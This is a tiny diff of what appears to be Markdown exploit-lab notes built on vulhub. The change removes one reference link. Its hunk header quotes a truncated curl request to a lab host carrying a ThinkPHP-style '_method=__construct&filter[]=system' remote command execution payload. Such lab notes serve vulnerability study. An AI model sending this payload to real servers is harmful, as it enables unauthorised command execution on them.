@@ -1342,4 +1342,3 @@ curl http://debian:8080/index.php?s=captcha -d "_method=__construct&filter[]=sys
 References
 
 - [vulhub](https://github.com/vulhub/vulhub)
-- [vulhub Document](https://vulhub.org/#/docs/)
